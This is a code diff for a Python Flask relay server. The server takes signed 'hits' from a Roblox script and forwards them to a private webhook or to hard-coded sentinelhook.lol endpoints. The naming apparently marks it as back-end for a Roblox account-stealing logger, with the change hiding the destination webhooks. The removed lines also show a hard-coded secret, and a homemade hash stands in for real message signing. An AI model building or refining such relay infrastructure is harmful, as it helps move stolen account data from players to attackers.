@@ -5,8 +5,11 @@ import requests
 
 app = Flask(__name__)
 
-# ←←← MUST match exactly what you put in the Roblox script
-SECRET = os.environ.get("SECRET", "k9FvT3xQ7mL2Zr8Pw6YdH1sU4aJcN5Bq0EoR7tVxM2uK9iC4yGfD8Wl3S6pAhZ1n")
+SECRET = os.environ.get("SECRET", "").encode("utf-8")
+PRIVATE_WEBHOOK = os.environ.get("PRIVATE_WEBHOOK")
+
+if not SECRET or not PRIVATE_WEBHOOK:
+    raise ValueError("Missing SECRET or PRIVATE_WEBHOOK env vars!")
 
 def simple_hash(s):
     hash_val = 0
@@ -18,10 +21,10 @@ def simple_hash(s):
 def receive_hit():
     timestamp = request.headers.get("X-Timestamp")
     signature = request.headers.get("X-Signature")
-    target_webhook = request.headers.get("DiscUser")   # ← this is what your script sends
+    target_code = request.headers.get("Target")   # "private", "dh", or "public"
 
-    if not timestamp or not signature or not target_webhook:
-        abort(403, "Missing required headers")
+    if not timestamp or not signature or not target_code:
+        abort(403, "Missing headers")
 
     # Timestamp check (5 min window)
     try:
@@ -33,18 +36,23 @@ def receive_hit():
 
     payload_raw = request.get_data(as_text=True)
     message = payload_raw + timestamp
-    expected_sig = simple_hash(SECRET + message)
+    expected_sig = simple_hash(SECRET.decode("utf-8") + message)
 
     if expected_sig != signature:
         abort(403, "Invalid signature")
 
-    # Forward to the real webhook (Discord or sentinelhook)
+    # Map short code → real URL
+    if target_code == "private":
+        forward_url = PRIVATE_WEBHOOK
+    elif target_code == "dh":
+        forward_url = "https://sentinelhook.lol/api.php?id=84G8pHk1nXxicwk"
+    elif target_code == "public":
+        forward_url = "https://sentinelhook.lol/api.php?id=Gc19GPjuqjxrrMQ"
+    else:
+        abort(400, "Invalid target")
+
     try:
-        resp = requests.post(
-            target_webhook,
-            data=payload_raw,
-            headers={"Content-Type": "application/json"}
-        )
+        resp = requests.post(forward_url, data=payload_raw, headers={"Content-Type": "application/json"})
         resp.raise_for_status()
         return {"status": "ok"}, 200
     except Exception as e:
